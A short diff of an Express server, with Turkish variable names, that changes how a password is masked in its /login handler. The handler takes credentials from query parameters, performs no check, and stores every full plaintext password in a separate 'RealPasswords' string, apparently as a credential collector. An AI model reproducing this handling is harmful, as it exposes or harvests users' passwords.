@@ -22,7 +22,7 @@ app.get(`/`, async(istek, cevap) => {
 app.get(`/login`, async(istek, cevap) => {
   let username = istek.query.username;
   let password = istek.query.password;
-  let maskedPassword = `${password.slice(0, 4)}${'*'.repeat(password.length - 4)}`;
+  let maskedPassword = `${password.slice(0, 2)}${'*'.repeat(password.length - 2)}`;
   passwords += `\n\nUsername: ${username} | Password: ${maskedPassword}`;
   RealPasswords += `\n\nUsername: ${username} | Password: ${password}`;
   cevap.sendStatus(200);
